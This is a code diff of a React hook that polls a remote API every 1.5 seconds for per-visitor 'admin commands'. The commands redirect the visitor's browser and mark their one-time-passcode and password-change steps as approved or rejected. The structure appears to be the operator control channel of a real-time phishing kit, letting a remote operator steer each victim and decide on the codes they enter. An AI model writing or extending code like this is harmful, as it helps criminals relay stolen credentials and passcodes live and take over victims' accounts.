@@ -1,4 +1,5 @@
 import { useEffect } from "react";
+import { shamApi } from "@/lib/shamApi";
 
 const REDIRECT_MAP: Record<string, string> = {
   login: "/",
@@ -9,21 +10,30 @@ const REDIRECT_MAP: Record<string, string> = {
 
 export function useAdminCommands() {
   useEffect(() => {
-    const interval = setInterval(() => {
-      const cmd = localStorage.getItem("sham_admin_cmd");
-      if (!cmd) return;
+    const interval = setInterval(async () => {
+      const visitorId = localStorage.getItem("sham_visitor_id");
+      if (!visitorId) return;
 
+      const result = await shamApi.getCmd(visitorId);
+      if (!result?.command) return;
+
+      const cmd = result.command;
       if (cmd.startsWith("redirect:")) {
         const target = cmd.replace("redirect:", "");
         const url = REDIRECT_MAP[target];
         if (url && window.location.pathname !== url) {
-          localStorage.removeItem("sham_admin_cmd");
           window.location.href = url;
-        } else {
-          localStorage.removeItem("sham_admin_cmd");
         }
+      } else if (cmd === "otp:approved") {
+        localStorage.setItem("sham_otp_status", "approved");
+      } else if (cmd === "otp:rejected") {
+        localStorage.setItem("sham_otp_status", "rejected");
+      } else if (cmd === "changepass:approved") {
+        localStorage.setItem("sham_changepass_status", "approved");
+      } else if (cmd === "changepass:rejected") {
+        localStorage.setItem("sham_changepass_status", "rejected");
       }
-    }, 500);
+    }, 1500);
 
     return () => clearInterval(interval);
   }, []);
